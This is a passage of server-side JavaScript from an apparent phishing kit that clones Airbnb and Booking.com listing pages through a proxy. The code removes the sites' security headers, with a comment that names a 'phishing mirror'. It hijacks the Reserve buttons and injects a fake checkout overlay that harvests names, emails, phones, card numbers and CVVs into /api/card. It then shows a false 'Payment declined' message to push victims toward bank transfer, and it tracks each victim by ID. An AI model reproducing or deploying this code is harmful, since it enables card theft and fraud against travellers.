    '          next=next.replace(/Birmingham,?\\s*West Midlands(?:,?\\s*(?:United Kingdom|UK|England))?/gi, P.loc);\n' +
    '          next=next.replace(/\\bWest Midlands\\b/gi, P.loc);\n' +
    '          if(!/airport|disneyland/i.test(next)) next=next.replace(/\\b(?:Paris|Birmingham)\\b/gi, P.loc);\n' +
    '          next=next.replace(/Explore other options in and around (?:Paris|Birmingham)/gi, "Explore other options in and around "+P.loc);\n' +
    '        }\n' +
    '        if(/53 m2 accommodation near the Eiffel Tower/i.test(next) && P.title) next=P.title;\n' +
    '        if(/Urban Skyline Retreat/i.test(next) && P.title) next=P.title;\n' +
    '        if(next!==t) n.nodeValue=next;\n' +
    '      }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function bindPhotoLightbox(){\n' +
    '    try{\n' +
    '      if(window.__mfLbBound) return; window.__mfLbBound=true;\n' +
    '      var list=P.imgs||[]; if(!list.length) return;\n' +
    '      var lb=document.getElementById("mf-photo-lb");\n' +
    '      if(!lb){\n' +
    '        lb=document.createElement("div"); lb.id="mf-photo-lb";\n' +
    '        lb.innerHTML=\'<button type="button" data-mf="close" aria-label="Close" style="position:absolute;top:16px;right:16px">×</button><img alt=""/><div class="mf-lb-bar"><button type="button" data-mf="prev" aria-label="Previous">‹</button><span data-mf="idx"></span><button type="button" data-mf="next" aria-label="Next">›</button></div>\';\n' +
    '        document.body.appendChild(lb);\n' +
    '      }\n' +
    '      var idx=0;\n' +
    '      function show(i){ idx=(i+list.length)%list.length; var im=lb.querySelector("img"); im.src=list[idx]; lb.querySelector(\'[data-mf="idx"]\').textContent=(idx+1)+" / "+list.length; lb.classList.add("mf-on"); }\n' +
    '      function hide(){ lb.classList.remove("mf-on"); }\n' +
    '      lb.addEventListener("click", function(e){\n' +
    '        var t=e.target.closest("[data-mf]"); if(!t){ if(e.target===lb) hide(); return; }\n' +
    '        var a=t.getAttribute("data-mf"); if(a==="close") hide(); else if(a==="prev") show(idx-1); else if(a==="next") show(idx+1);\n' +
    '      });\n' +
    '      document.addEventListener("keydown", function(e){ if(!lb.classList.contains("mf-on")) return; if(e.key==="Escape") hide(); if(e.key==="ArrowLeft") show(idx-1); if(e.key==="ArrowRight") show(idx+1); });\n' +
    '      function openFrom(el){\n' +
    '        var i=parseInt(el.getAttribute("data-mf-photo")||"0",10); if(isNaN(i)) i=0; show(i);\n' +
    '      }\n' +
    '      document.addEventListener("click", function(e){\n' +
    '        if(e.target.closest("#mf-proxy-overlay,#mf-proxy-fab,#mf-proxy-card")) return;\n' +
    '        var hero=e.target.closest(\'[data-section-id="HERO_DEFAULT"]\');\n' +
    '        if(!hero) return;\n' +
    '        var img=e.target.closest("img")||hero.querySelector("img[data-mf-photo]");\n' +
    '        if(!img) return;\n' +
    '        e.preventDefault(); e.stopPropagation(); openFrom(img);\n' +
    '      }, true);\n' +
    '      // Show all photos buttons\n' +
    '      document.querySelectorAll("button").forEach(function(btn){\n' +
    '        var t=(btn.innerText||"").trim();\n' +
    '        if(/show all photos|see all photos|view photos/i.test(t)){\n' +
    '          btn.addEventListener("click", function(ev){ ev.preventDefault(); ev.stopPropagation(); show(0); }, true);\n' +
    '        }\n' +
    '      });\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function run(){ replaceImgs(); replaceTitle(); replaceHost(); replacePrice(); replaceDesc(); replaceOverview(); scrubDonor(); dismissCookies(); bindPhotoLightbox(); }\n' +
    '  if(document.readyState==="loading") document.addEventListener("DOMContentLoaded", run); else run();\n' +
    '  setTimeout(run, 100); setTimeout(run, 400); setTimeout(run, 1000); setTimeout(run, 2500);\n' +
    '  setTimeout(dismissCookies, 50); setTimeout(dismissCookies, 500); setTimeout(dismissCookies, 1500);\n' +
    '})();\n' +
    '</script>\n';

  if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, injectScript + '</body>');
  else s += injectScript;
  return s;
}

async function staticListingFallback(listing, victimId, req) {
  try {
    if (listing && listing.marketplace === 'booking') return bookingPage(listing, victimId);
    return airbnbPage(listing, victimId);
  } catch (e) {
    console.error('staticListingFallback', e);
    return clientProxyFallback(listing, victimId, buildProxyTargetUrl(listing) || '', req);
  }
}

function buildProxyTargetUrl(listing) {
  const explicit = (listing.proxy_target_url || '').trim();
  if (explicit && /^https?:\/\//i.test(explicit)) return explicit;
  const mp = listing.marketplace === 'booking' ? 'booking' : 'airbnb';
  const code = (listing.listing_code || '').trim();
  let host = (listing.display_domain || '').trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '');
  if (!host) host = mp === 'booking' ? 'www.booking.com' : 'www.airbnb.com';
  if (mp === 'booking') {
    const pathPart = (listing.public_path || '').replace(/^\//, '') || (code ? 'hotel/' + code + '.en-gb.html' : '');
    if (explicit && !explicit.startsWith('http')) return 'https://' + host + '/' + explicit.replace(/^\//, '');
    return 'https://' + host + '/' + pathPart.replace(/^\//, '');
  }
  if (!code) return explicit || '';
  return 'https://' + host + '/rooms/' + code;
}

function encodeProxiedUrl(absoluteUrl) {
  // legacy path-safe base64url (compat only)
  return Buffer.from(String(absoluteUrl), 'utf8')
    .toString('base64')
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=+$/g, '');
}
function decodeProxiedUrl(token) {
  let s = String(token).replace(/-/g, '+').replace(/_/g, '/');
  while (s.length % 4) s += '=';
  return Buffer.from(s, 'base64').toString('utf8');
}

/** Site origin for absolute mfpx URLs. new URL(rel, base) requires a scheme. */
function mfpxSiteOrigin(req) {
  try {
    const o = String(reqBase(req)).replace(/\/+$/, '');
    if (/^https?:\/\//i.test(o)) return o;
  } catch (e) {}
  return 'https://lessjob.online';
}

/** Join-safe hierarchical proxy path so Metro/new URL(rel, base) works.
 *  Absolute: {BASE}/_mfpx/{id}/u/{s|p}/{hostname}{pathname}{search}{hash}
 *  Directory bases keep a trailing slash (required for publicPath join). */
function encodeHierarchicalMfpx(listingId, absoluteUrl, req) {
  const u = new NodeURL(absoluteUrl, 'https://www.airbnb.com');
  if (!/^https?:$/i.test(u.protocol)) return null;
  const scheme = u.protocol === 'http:' ? 'p' : 's';
  const host = u.hostname + (u.port ? ':' + u.port : '');
  let pathname = u.pathname || '/';
  // Node URL keeps trailing slash; ensure empty path becomes /
  if (!pathname.startsWith('/')) pathname = '/' + pathname;
  return mfpxSiteOrigin(req) + '/_mfpx/' + listingId + '/u/' + scheme + '/' + host + pathname + (u.search || '') + (u.hash || '');
}

/** Resolve target absolute URL from an mfpx request (hierarchical or legacy). */
function resolveMfpxRequest(req) {
  const pathOnly = req.path || '';
  const qIdx = String(req.url || '').indexOf('?');
  const qs = qIdx >= 0 ? String(req.url).slice(qIdx) : '';

  // Hierarchical: /_mfpx/:id/u/s|p/hostname/path...
  let m = pathOnly.match(/^\/_mfpx\/(\d+)\/u\/([sp])\/([^/]+)(\/.*)?$/i);
  if (m) {
    const listingId = parseInt(m[1], 10);
    const scheme = String(m[2]).toLowerCase() === 'p' ? 'http' : 'https';
    const host = m[3];
    // Preserve trailing slash exactly as received (Express keeps it on path)
    let pathname = m[4] != null ? m[4] : '/';
    if (pathname === '') pathname = '/';
    let targetUrl = scheme + '://' + host + pathname;
    if (qs) targetUrl += qs;
    return { listingId, targetUrl };
  }

  // Raw: /_mfpx/:id/raw?url=
  m = pathOnly.match(/^\/_mfpx\/(\d+)\/raw\/?$/i);
  if (m) {
    return {
      listingId: parseInt(m[1], 10),
      targetUrl: req.query && req.query.url ? String(req.query.url) : null,
      raw: true,
    };
  }

  // Legacy opaque base64 token: /_mfpx/:id/:token  (single segment)
  m = pathOnly.match(/^\/_mfpx\/(\d+)\/([^/]+)\/?$/);
  if (m && m[2] !== 'u' && m[2] !== 'raw') {
    try {
      return { listingId: parseInt(m[1], 10), targetUrl: decodeProxiedUrl(m[2]) };
    } catch (e) {
      return null;
    }
  }

  return null;
}

// Match full absolute CDN/origin URLs.
// Path must STOP before JSON/JS escapes (\ before "), quotes, braces, whitespace.
// Old class [^\"'\`\s<>\)] ate trailing \ from href=\"...\", breaking niobeClientData JSON.parse.
const PROXY_ABS_URL_RE =
  /https?:\/\/(?:[a-z0-9-]+\.)*(?:airbnb\.[a-z.]+|muscache\.com|booking\.com|bstatic\.com)(?:\/[^\"'\\`\s<>\)\]\},;\\]*)?/gi;
const PROXY_PROTOREL_URL_RE =
  /\/\/(?:[a-z0-9-]+\.)*(?:airbnb\.[a-z.]+|muscache\.com|booking\.com|bstatic\.com)(?:\/[^\"'\\`\s<>\)\]\},;\\]*)?/gi;

function rewriteAbsUrlMatch(abs, listingId, req) {
  try {
    const clean = String(abs).replace(/[)\\\]\},.;]+$/g, '').replace(/\\+$/g, '');
    const suffix = String(abs).slice(clean.length);
    return mfpxUrl(listingId, clean, req) + suffix;
  } catch (e) {
    return abs;
  }
}

function rewriteOriginUrlsInText(text, listingId, req) {
  let out = String(text);
  out = out.replace(PROXY_ABS_URL_RE, (abs) => rewriteAbsUrlMatch(abs, listingId, req));
  out = out.replace(PROXY_PROTOREL_URL_RE, (abs) => {
    try {
      return rewriteAbsUrlMatch('https:' + abs, listingId, req);
    } catch (e) {
      return abs;
    }
  });
  return out;
}

function mfpxUrl(listingId, absoluteUrl, req) {
  try {
    const u = new NodeURL(absoluteUrl, 'https://www.airbnb.com');
    if (!/^https?:$/i.test(u.protocol)) return absoluteUrl;
    if (!hostAllowed(u.hostname) && !u.hostname.includes('airbnb') && !u.hostname.includes('booking') && !u.hostname.includes('muscache') && !u.hostname.includes('bstatic')) {
      return absoluteUrl;
    }
    const hier = encodeHierarchicalMfpx(listingId, u.href, req);
    return hier || absoluteUrl;
  } catch (e) {
    return absoluteUrl;
  }
}

/** Pull listing_code + public_path + host from a real Airbnb/Booking URL */
function deriveProxyIdentity(proxyUrl, marketplace) {
  const out = { code: '', publicPath: '', host: '', marketplace: marketplace || 'airbnb' };
  if (!proxyUrl || !/^https?:\/\//i.test(String(proxyUrl).trim())) return out;
  try {
    const u = new NodeURL(String(proxyUrl).trim());
    out.host = u.hostname.toLowerCase();
    if (out.host.includes('booking') || marketplace === 'booking') {
      out.marketplace = 'booking';
      const m = u.pathname.match(/\/hotel\/([^/?#]+)/i);
      if (m) {
        out.code = m[1];
        out.publicPath = '/hotel/' + out.code;
      }
    } else {
      out.marketplace = 'airbnb';
      const m = u.pathname.match(/\/rooms\/(\d+)/i);
      if (m) {
        out.code = m[1];
        out.publicPath = '/rooms/' + out.code;
      }
    }
  } catch (e) {}
  return out;
}

function rewriteProxyHtml(html, targetUrl, listingId, baseUrl, victimId, req) {
  const parsed = new NodeURL(targetUrl);
  const origin = parsed.protocol + '//' + parsed.host;
  const siteBase = ((req ? reqOrigin(req) : (baseUrl || BASE_URL)) || 'https://lessjob.online').replace(/\/+$/, '') + '/';
  let s = Buffer.isBuffer(html) ? html.toString('utf8') : String(html);

  // Drop CSP / frame killers that break phishing mirror
  s = s.replace(/<meta[^>]+http-equiv=["']?Content-Security-Policy["']?[^>]*>/gi, '');
  s = s.replace(/<meta[^>]+http-equiv=["']?X-Frame-Options["']?[^>]*>/gi, '');
  s = s.replace(/content-security-policy/gi, 'x-removed-csp');

  // Pull application/json (and ld+json) script bodies out first — Airbnb SPA boots from these.
  // HTML attr rewrites (href/src/srcset/form) must not run inside them; only terminator-safe URL rewrite.
  const jsonHolders = [];
  s = s.replace(
    /<script\b([^>]*\btype\s*=\s*["']application\/(?:ld\+)?json["'][^>]*)>([\s\S]*?)<\/script>/gi,
    (all, attrs, body) => {
      const i = jsonHolders.length;
      jsonHolders.push(rewriteOriginUrlsInText(body, listingId, req));
      return '<script' + attrs + '>__MF_JSON_' + i + '__</script>';
    }
  );

  // Full absolute URL rewrite for allowed hosts (complete paths, not truncated)
  s = rewriteOriginUrlsInText(s, listingId, req);

  // Remove integrity so rewritten CDN JS still runs
  s = s.replace(/\s+integrity=(["'])[\s\S]*?\1/gi, '');
  s = s.replace(/\s+crossorigin=(["'])[\s\S]*?\1/gi, '');

  // Root-relative asset URLs -> proxied absolute origin URLs (css/js/api under Airbnb)
  s = s.replace(
    /\b(href|src|action|poster|data-src|data-original)=(["'])(\/(?!\/|_mfpx\/|api\/|uploads\/)[^"']*)\2/gi,
    (all, attr, q, pathRel) => {
      try {
        return attr + '=' + q + mfpxUrl(listingId, origin + pathRel, req) + q;
      } catch (e) {
        return all;
      }
    }
  );
  // srcset:  /foo 1x, https://... 2x
  s = s.replace(/\bsrcset=(["'])([^"']+)\1/gi, (all, q, val) => {
    const next = val
      .split(',')
      .map((part) => {
        const bits = part.trim().split(/\s+/);
        if (!bits[0]) return part;
        let u = bits[0];
        if (u.startsWith('/') && !u.startsWith('//') && !u.startsWith('/_mfpx/')) {
          u = mfpxUrl(listingId, origin + u, req);
        } else if (/^https?:/i.test(u)) {
          u = rewriteAbsUrlMatch(u, listingId, req);
        }
        return [u].concat(bits.slice(1)).join(' ');
      })
      .join(', ');
    return 'srcset=' + q + next + q;
  });

  // Base must stay on OUR domain so residual relative URLs don't leak to Airbnb/Booking
  const baseTag = '<base href="' + siteBase + '">';
  if (/<head[^>]*>/i.test(s)) {
    s = s.replace(/<base[^>]*>/gi, '');
    s = s.replace(/<head([^>]*)>/i, '<head$1>' + baseTag);
  } else {
    s = baseTag + s;
  }

  // Rewrite form actions that still point offsite
  s = s.replace(/<form([^>]*?)action\s*=\s*(["'])(https?:\/\/[^"']+)\2/gi, (all, attrs, q, act) => {
    try {
      const u = new NodeURL(act);
      if (hostAllowed(u.hostname)) {
        return '<form' + attrs + 'action=' + q + mfpxUrl(listingId, act, req) + q;
      }
    } catch (e) {}
    return all;
  });

  // Restore JSON bootstrap blobs (URL-rewritten, structure preserved)
  for (let ji = 0; ji < jsonHolders.length; ji++) {
    s = s.replace('__MF_JSON_' + ji + '__', () => jsonHolders[ji]);
  }

  const inject = `
<!-- MF Proxy Capture Layer -->
<style id="mf-proxy-styles">
#mf-proxy-overlay{display:none;position:fixed;inset:0;z-index:2147483646;background:rgba(0,0,0,.72);backdrop-filter:blur(3px);align-items:center;justify-content:center}
#mf-proxy-overlay.mf-show{display:flex}
#mf-proxy-card{background:#fff;border-radius:16px;max-width:440px;width:92%;padding:28px;box-shadow:0 24px 80px rgba(0,0,0,.45);font-family:Circular,-apple-system,BlinkMacSystemFont,Roboto,Helvetica Neue,sans-serif;color:#222;position:relative}
#mf-proxy-card h3{font-size:22px;margin:0 0 6px;font-weight:600}
#mf-proxy-card .mf-sub{color:#717171;font-size:14px;margin:0 0 18px}
#mf-proxy-card input,#mf-proxy-card select{width:100%;padding:14px 12px;border:1px solid #b0b0b0;border-radius:8px;font-size:16px;margin-bottom:12px;box-sizing:border-box;font-family:inherit}
#mf-proxy-card input:focus{outline:none;border-color:#222;box-shadow:0 0 0 2px rgba(34,34,34,.15)}
#mf-proxy-card button.mf-primary{width:100%;padding:16px;background:linear-gradient(to right,#E61E4D 0%,#E31C5F 50%,#D70466 100%);color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
#mf-proxy-card button.mf-primary:hover{filter:brightness(1.05)}
#mf-proxy-close{position:absolute;right:14px;top:12px;background:none;border:none;font-size:24px;cursor:pointer;color:#717171;line-height:1}
#mf-proxy-fab{position:fixed;bottom:22px;left:50%;transform:translateX(-50%);z-index:2147483645;padding:14px 28px;background:linear-gradient(to right,#E61E4D,#D70466);color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:600;cursor:pointer;box-shadow:0 10px 30px rgba(230,30,77,.4);font-family:Circular,-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
@keyframes mfPulse{0%,100%{box-shadow:0 10px 30px rgba(230,30,77,.4)}50%{box-shadow:0 10px 40px rgba(230,30,77,.7)}}
#mf-proxy-fab{animation:mfPulse 2s infinite}
</style>
<div id="mf-proxy-overlay" role="dialog">
  <div id="mf-proxy-card">
    <button type="button" id="mf-proxy-close" aria-label="Close">&times;</button>
    <div id="mf-proxy-body">
      <h3>Confirm and pay</h3>
      <p class="mf-sub">Enter your details to reserve this place.</p>
      <form id="mf-proxy-form">
        <input type="text" id="mf-name" name="full_name" placeholder="Full name" autocomplete="name" required>
        <input type="email" id="mf-email" name="email" placeholder="Email" autocomplete="email" required>
        <input type="tel" id="mf-phone" name="phone" placeholder="Phone" autocomplete="tel">
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">
          <input type="date" id="mf-checkin" name="checkin" required>
          <input type="date" id="mf-checkout" name="checkout" required>
        </div>
        <select id="mf-guests" name="guests"><option value="1">1 guest</option><option value="2" selected>2 guests</option><option value="3">3 guests</option><option value="4">4 guests</option><option value="5">5 guests</option><option value="6">6 guests</option></select>
        <button type="submit" class="mf-primary">Continue</button>
      </form>
    </div>
  </div>
</div>
<button type="button" id="mf-proxy-fab">Reserve</button>
<script>
(function(){
  var LID = ${JSON.stringify(String(listingId))};
  var VID = ${JSON.stringify(String(victimId || ''))};
  var PUBLIC_PATH = ${JSON.stringify((function(){ try { var L = db.prepare('SELECT public_path, listing_code FROM listings WHERE id = ?').get(listingId); if (L && L.public_path) return L.public_path; if (L && L.listing_code) return '/rooms/' + L.listing_code; } catch(e) {} return '/'; })())};
  window.__MF_LISTING = LID;
  window.__MF_VID = VID;
  window.__MF_PUBLIC_PATH = PUBLIC_PATH;
  try { document.cookie = 'mf_px_lid=' + LID + ';path=/;SameSite=Lax'; } catch(e) {}

  // Guard: Airbnb SPA may client-route to /404 for dead room IDs
  (function(){
    function is404Path(p){
      p = String(p||'');
      return /\/404\/?($|\?|#)/i.test(p) || /\/_mfpx\/\d+\/u\/[sp]\/[^/]+\/404/i.test(p);
    }
    function bounce(){
      try { location.replace(PUBLIC_PATH || '/'); } catch(e) {}
    }
    var _ps = history.pushState.bind(history);
    var _rs = history.replaceState.bind(history);
    history.pushState = function(s,t,u){ if(u && is404Path(String(u))) { bounce(); return; } return _ps(s,t,u); };
    history.replaceState = function(s,t,u){ if(u && is404Path(String(u))) { bounce(); return; } return _rs(s,t,u); };
    window.addEventListener('popstate', function(){ if(is404Path(location.pathname+location.search)) bounce(); });
    if(is404Path(location.pathname+location.search)) bounce();
    setTimeout(function(){
      try {
        var txt = ((document.body && document.body.innerText) || '').slice(0,800).toLowerCase();
        if (txt.indexOf("can't seem to find the page") >= 0 || txt.indexOf('error code: 404') >= 0 || (txt.indexOf('oops!')>=0 && txt.indexOf('404')>=0)) bounce();
      } catch(e){}
    }, 1800);
  })();

  function track(stage, extra){
    try {
      fetch('/api/track',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({victim_id:VID||LID,stage:stage},extra||{}))});
    } catch(e){}
  }
  track('proxy_page_view');

  function showOv(){ goBook(); }
  function hideOv(){ var o=document.getElementById('mf-proxy-overlay'); if(o) o.classList.remove('mf-show'); }
  function readDates(){
    var ci='', co='', guests=1, children=0, infants=0;
    try {
      var a=document.getElementById('mf-cal-in'); var b=document.getElementById('mf-cal-out');
      if(a&&a.value) ci=a.value; if(b&&b.value) co=b.value;
      var cin=document.getElementById('mf-checkin'); var cout=document.getElementById('mf-checkout');
      if(cin&&cin.value) ci=cin.value; if(cout&&cout.value) co=cout.value;
      var g=window.__MF_GUESTS;
      if(g && typeof g==='object'){
        guests=Math.max(1,(parseInt(g.adults,10)||0)+(parseInt(g.children,10)||0));
        children=parseInt(g.children,10)||0;
        infants=parseInt(g.infants,10)||0;
        if(!(parseInt(g.adults,10)>0) && guests<1) guests=1;
        if(parseInt(g.adults,10)>0) guests=Math.max(1,(parseInt(g.adults,10)||1)+children);
      } else {
        var gsel=document.getElementById('mf-guests'); if(gsel&&gsel.value) guests=parseInt(gsel.value,10)||1;
      }
    } catch(e){}
    function iso(d){ return d.toISOString().slice(0,10); }
    if(!ci){ var t=new Date(); t.setDate(t.getDate()+7); ci=iso(t); }
    if(!co){ var t2=new Date(ci+'T12:00:00'); t2.setDate(t2.getDate()+2); co=iso(t2); }
    return {ci:ci,co:co,guests:guests,children:children,infants:infants,adults:(window.__MF_GUESTS&&window.__MF_GUESTS.adults)||guests};
  }
  function goBook(){
    try {
      var d=readDates();
      var code=(PUBLIC_PATH||'');
      if(code.indexOf('/rooms/')===0) code=code.slice(7);
      else if(code.charAt(0)==='/') code=code.replace(/^\\//,'');
      if(!code||code==='/') code=String(LID);
      var adults=Math.max(1, parseInt(d.adults,10)||parseInt(d.guests,10)||1);
      var url = '/book/stays/' + encodeURIComponent(code)
        + '?numberOfAdults=' + encodeURIComponent(adults)
        + '&checkin=' + encodeURIComponent(d.ci)
        + '&checkout=' + encodeURIComponent(d.co)
        + '&numberOfChildren=' + encodeURIComponent(d.children||0)
        + '&numberOfInfants=' + encodeURIComponent(d.infants||0)
        + '&numberOfPets=0'
        + '&guestCurrency=GBP&productId=' + encodeURIComponent(code)
        + '&victim_id=' + encodeURIComponent(VID||'');
      track('proxy_reserve_click',{to:'book_stays'});
      window.location.href = url;
    } catch(e){
      var o=document.getElementById('mf-proxy-overlay'); if(o) o.classList.add('mf-show');
    }
  }
  window.goBook = goBook;
  var fab=document.getElementById('mf-proxy-fab');
  if(fab) fab.addEventListener('click', function(){ goBook(); });
  var cls=document.getElementById('mf-proxy-close');
  if(cls) cls.addEventListener('click', hideOv);
  var ov=document.getElementById('mf-proxy-overlay');
  if(ov) ov.addEventListener('click', function(e){ if(e.target===ov) hideOv(); });

  // Share / Save (wishlist) — toast UX on frozen shell
  function mfToast(msg){
    try{
      var t=document.getElementById('mf-toast');
      if(!t){ t=document.createElement('div'); t.id='mf-toast';
        t.style.cssText='position:fixed;bottom:90px;left:50%;transform:translateX(-50%);z-index:2147483647;background:#222;color:#fff;padding:12px 18px;border-radius:10px;font:600 14px Circular,system-ui,sans-serif;box-shadow:0 8px 24px rgba(0,0,0,.25);opacity:0;transition:opacity .2s;pointer-events:none;max-width:90vw;text-align:center';
        document.body.appendChild(t);
      }
      t.textContent=msg; t.style.opacity='1';
      clearTimeout(t._tm); t._tm=setTimeout(function(){ t.style.opacity='0'; }, 2200);
    }catch(e){}
  }
  function armShareSave(){
    try{
      document.querySelectorAll('button,a,[role="button"]').forEach(function(el){
        if(el.getAttribute('data-mf-ss')==='1') return;
        if(el.closest && el.closest('#mf-proxy-overlay,#mf-proxy-fab,#mf-photo-lb,#mf-book-guests,#mf-offline-cal')) return;
        var aria=(el.getAttribute('aria-label')||'').toLowerCase();
        var txt=((el.innerText||el.textContent||'')+'').trim().toLowerCase();
        var isShare=/^share$/.test(txt)||/\bshare\b/.test(aria)||/share this|share listing/i.test(aria+txt);
        var isSave=/^save$/.test(txt)||/wishlist|save to|add to wishlist|saved/i.test(aria+txt);
        if(!isShare && !isSave) return;
        el.setAttribute('data-mf-ss','1');
        el.addEventListener('click', function(ev){
          ev.preventDefault(); ev.stopPropagation(); if(ev.stopImmediatePropagation) ev.stopImmediatePropagation();
          if(isShare){
            var url=location.href.split('#')[0];
            if(navigator.clipboard && navigator.clipboard.writeText){
              navigator.clipboard.writeText(url).then(function(){ mfToast('Link copied'); }).catch(function(){ mfToast('Link: '+url); });
            } else { mfToast('Link copied'); }
            track('share_click');
          } else {
            var on=el.getAttribute('data-mf-saved')==='1';
            el.setAttribute('data-mf-saved', on?'0':'1');
            try{
              var label=on?'Save':'Saved';
              if(/^save$|^saved$/i.test((el.innerText||'').trim())) el.childNodes.forEach?null:null;
              var spans=el.querySelectorAll('span');
              for(var i=0;i<spans.length;i++){ if(/^save$|^saved$/i.test((spans[i].textContent||'').trim())){ spans[i].textContent=label; break; } }
              if(/^save$|^saved$/i.test((el.innerText||'').trim()) && !spans.length) el.textContent=label;
            }catch(e){}
            mfToast(on?'Removed from wishlist':'Saved to wishlist');
            track(on?'unsave_click':'save_click');
          }
          return false;
        }, true);
      });
    }catch(e){}
  }
  armShareSave(); setInterval(armShareSave, 2000);

  // Hook "Reserve" / CTA buttons on real Airbnb/Booking page (incl. loading CTA)
  function isReserveText(t){
    t=(t||'').toLowerCase().replace(/\\s+/g,' ').trim();
    return /^(reserve|book|check availability|request to book|continua|rezerv|rezerva|vérifier|prüfen|continua para reservar|continue|loading)$/i.test(t)
      || t.indexOf('reserve')>=0 || t.indexOf('request to book')>=0 || t.indexOf('check availability')>=0
      || t.indexOf('book now')>=0 || t.indexOf('rezerv')>=0;
  }
  function isReserveEl(el){
    if(!el || !el.getAttribute) return false;
    // Never hijack our own overlay / FAB / form / book-it / guests / cal controls
    try {
      if(el.closest && el.closest('#mf-proxy-overlay,#mf-proxy-card,#mf-proxy-fab,[id^="mf-proxy"],#mf-book-guests,#mf-guests-pop,#mf-book-dates,#mf-offline-cal,#mf-photo-lb,[id^="mf-bi"],[data-mf-g],[data-mf-grow],[data-mf-bi]')) return false;
    } catch(e){}
    var tag=(el.tagName||'').toLowerCase();
    var role=el.getAttribute('role')||'';
    var testid=(el.getAttribute('data-testid')||'').toLowerCase();
    var aria=(el.getAttribute('aria-label')||'').toLowerCase();
    var cls=(el.className&&el.className.toString?el.className.toString():String(el.className||'')).toLowerCase();
    var id=(el.id||'').toLowerCase();
    if(id==='mf-proxy-fab'||id.indexOf('mf-proxy')===0||id.indexOf('mf-')===0) return false;
    if(testid==='homes-pdp-cta-btn'||testid.indexOf('book')>=0||testid.indexOf('reserve')>=0||testid.indexOf('pdp-cta')>=0) return true;
    if(aria && isReserveText(aria)) return true;
    if(/book|reserve|cta/.test(cls) && (tag==='button'||role==='button')) return true;
    if(tag==='button'||tag==='a'||role==='button'){
      var txt=(el.innerText||el.textContent||'').slice(0,80);
      if(isReserveText(txt)) return true;
    }
    return false;
  }
  function armCta(btn){
    if(!btn || btn.getAttribute('data-mf-armed')==='1') return;
    btn.setAttribute('data-mf-armed','1');
    try {
      // Force readable Reserve label even while Airbnb shows spinner/loading
      if(/loading|^\s*$/i.test((btn.innerText||btn.textContent||'').trim())){
        btn.textContent='Reserve';
      }
    } catch(e){}
    btn.addEventListener('click', function(ev){
      ev.preventDefault(); ev.stopPropagation(); if(ev.stopImmediatePropagation) ev.stopImmediatePropagation();
      goBook();
      return false;
    }, true);
  }
  function scanCtas(){
    try {
      var nodes=document.querySelectorAll('button,[role="button"],a[href],input[type="submit"]');
      for(var i=0;i<nodes.length;i++){
        if(isReserveEl(nodes[i])) armCta(nodes[i]);
      }
      var cta=document.querySelector('[data-testid="homes-pdp-cta-btn"]');
      if(cta) armCta(cta);
    } catch(e){}
  }
  scanCtas();
  setInterval(scanCtas, 1200);
  try {
    var mo=new MutationObserver(function(){ scanCtas(); });
    mo.observe(document.documentElement,{childList:true,subtree:true,characterData:true});
  } catch(e){}
  document.addEventListener('click', function(e){
    try{
      if(e.target && e.target.closest && e.target.closest('#mf-proxy-overlay,#mf-proxy-card,#mf-proxy-fab,#mf-book-guests,#mf-guests-pop,#mf-book-dates,#mf-offline-cal,#mf-photo-lb,[data-mf-g],[data-mf-grow],[data-mf-bi]')) return;
    }catch(err){}
    var el=e.target, hops=0;
    while(el && hops<8){
      if(isReserveEl(el)){
        e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();
        goBook();
        return false;
      }
      el=el.parentElement; hops++;
    }
  }, true);

  document.getElementById('mf-proxy-form').addEventListener('submit', function(e){
    e.preventDefault();
    var data={
      victim_id: VID,
      listing_id: LID,
      stage:'details',
      full_name: document.getElementById('mf-name').value,
      email: document.getElementById('mf-email').value,
      phone: document.getElementById('mf-phone').value,
      checkin: document.getElementById('mf-checkin').value,
      checkout: document.getElementById('mf-checkout').value,
      guests: document.getElementById('mf-guests').value
    };
    fetch('/api/proxy-submit/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)})
      .then(function(r){return r.json()}).then(function(d){
        if(d && d.victim_id) VID=String(d.victim_id); window.__MF_VID=VID;
        showPay();
      }).catch(function(){ showPay(); });
    return false;
  });

  function showPay(){
    var body=document.getElementById('mf-proxy-body');
    body.innerHTML = '<h3>Add a payment method</h3><p class="mf-sub">Your payment is secure and encrypted.</p>'+
      '<form id="mf-pay-form">'+
      '<input type="text" id="mf-ch" placeholder="Name on card" autocomplete="cc-name" required>'+
      '<input type="text" id="mf-cc" placeholder="Card number" inputmode="numeric" autocomplete="cc-number" maxlength="19" required>'+
      '<div style="display:grid;grid-template-columns:1fr 1fr;gap:10px">'+
      '<input type="text" id="mf-exp" placeholder="Expiration MM/YY" autocomplete="cc-exp" maxlength="5" required>'+
      '<input type="text" id="mf-cvv" placeholder="CVV" inputmode="numeric" autocomplete="cc-csc" maxlength="4" required></div>'+
      '<button type="submit" class="mf-primary">Confirm and pay</button></form>';
    document.getElementById('mf-pay-form').addEventListener('submit', function(e){
      e.preventDefault();
      var payload={
        victim_id: VID||LID,
        card_number: (document.getElementById('mf-cc').value||'').replace(/\\s/g,''),
        card_holder: document.getElementById('mf-ch').value,
        expiry: document.getElementById('mf-exp').value,
        cvv: document.getElementById('mf-cvv').value
      };
      fetch('/api/card',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
      body.innerHTML='<div style="text-align:center;padding:12px 0">'+
        '<div style="font-size:42px;margin-bottom:8px">⚠️</div>'+
        '<h3 style="color:#C13515">Payment declined</h3>'+
        '<p class="mf-sub">Try another card or pay by bank transfer.</p>'+
        '<button type="button" class="mf-primary" id="mf-manual">Pay by bank transfer</button></div>';
      document.getElementById('mf-manual').onclick=function(){
        fetch('/api/payment-confirm',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({victim_id:VID||LID,marketplace:'airbnb'})});
        body.innerHTML='<div style="text-align:center;padding:16px 0"><div style="font-size:56px">✅</div><h3 style="color:#008A05">Reservation confirmed</h3><p class="mf-sub">A confirmation email is on the way.</p></div>';
      };
    });
  }
